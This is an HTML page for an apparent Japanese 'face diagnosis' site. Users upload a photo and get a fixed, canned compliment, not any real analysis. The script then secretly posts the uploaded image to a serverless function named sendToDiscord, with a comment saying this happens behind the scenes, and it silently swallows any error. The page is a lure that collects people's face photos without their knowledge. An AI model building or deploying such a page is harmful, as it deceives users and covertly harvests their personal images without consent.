<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>顔診断サイト</title>

  <style>
    body {
      background: #000;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding: 30px;
    }

    button {
      padding: 10px 20px;
      font-size: 16px;
      margin-top: 10px;
    }

    img {
      margin-top: 20px;
      max-width: 100%;
      border-radius: 10px;
      display: none;
    }

    #result {
      margin-top: 20px;
      font-size: 18px;
      white-space: pre-line;
      display: none;
    }
  </style>
</head>
<body>

  <h1>顔診断</h1>

  <input type="file" id="file" accept="image/*"><br>
  <button onclick="send()">診断する</button>

  <img id="preview">
  <div id="result"></div>

  <script>
    async function send() {
      const fileInput = document.getElementById("file");
      const file = fileInput.files[0];

      if (!file) {
        alert("画像を選んでください");
        return;
      }

      const reader = new FileReader();

      // ★ここが reader.onload
      reader.onload = async () => {

        // ① 画像プレビュー
        const img = document.getElementById("preview");
        img.src = reader.result;
        img.style.display = "block";

        // ② 診断結果表示（仮）
        const resultDiv = document.getElementById("result");
        resultDiv.innerText =
          "診断結果\n\n" +
          "全体のバランスが良く、\n" +
          "第一印象がとても整った顔立ちです。";
        resultDiv.style.display = "block";

        // ③ Discordへ送信（裏で）
        try {
          await fetch("/.netlify/functions/sendToDiscord", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              image: reader.result
            })
          });
        } catch (e) {
          console.log("Discord送信エラー");
        }
      };

      // ★これで onload が発火する
      reader.readAsDataURL(file);
    }
  </script>

</body>
</html>
